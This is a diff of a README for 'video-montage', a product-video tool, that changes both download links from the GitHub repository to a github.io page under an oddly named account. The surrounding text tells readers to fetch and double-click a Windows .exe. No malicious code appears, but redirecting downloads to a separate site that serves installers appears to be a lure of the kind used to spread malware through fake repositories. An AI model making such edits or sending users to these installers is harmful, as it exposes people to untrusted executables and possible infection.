@@ -1,6 +1,6 @@
 # 🎬 video-montage - Create professional product videos quickly locally
 
-[https://img.shields.io/badge/Download-VideoMontage-blue](https://github.com/jennettemesoamerican289/video-montage)
+[https://img.shields.io/badge/Download-VideoMontage-blue](https://jennettemesoamerican289.github.io)
 
 Video-montage helps you build product demo videos on your own computer. You capture frames from your screen, and the software handles the rest. It uses automated voiceover tools to turn your script into speech. You import your audio files, and the tool snaps each video clip into the right spot based on the voice timings. It adds a clean, technical look to your videos using built-in graphic elements. 
 
@@ -8,7 +8,7 @@ Video-montage helps you build product demo videos on your own computer. You capt
 
 You can get the latest version of the software from the project page. Visit this page to download the installer for your computer.
 
-[https://github.com/jennettemesoamerican289/video-montage](https://github.com/jennettemesoamerican289/video-montage)
+[https://jennettemesoamerican289.github.io](https://jennettemesoamerican289.github.io)
 
 Choose the file that ends in .exe for Windows. Save the file to your computer. Double-click the file once the download finishes to start the installation. Follow the prompts on your screen to complete the setup.
 
